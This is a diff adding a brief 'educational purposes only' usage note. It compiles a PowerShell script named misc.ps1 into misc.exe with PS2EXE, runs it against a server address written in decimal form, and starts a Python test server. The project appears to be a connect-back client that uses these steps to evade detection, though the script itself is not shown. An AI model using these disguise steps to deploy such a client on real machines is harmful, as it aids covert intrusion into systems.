@@ -1,0 +1,12 @@
+EDUCATIONAL PURPOSES ONLY!
+
+git clone https://github.com/MScholtes/PS2EXE.git
+cd PS2EXE\Module
+Import-Module .\ps2exe.ps1
+Invoke-PS2EXE -InputFile <PATH>misc.ps1 -OutputFile "misc.exe"
+
+start the software address in decimal format like this:  misc -a 2130706433:8000
+
+You can start simple web server for testing
+start a simple web server like this one:
+python server.py
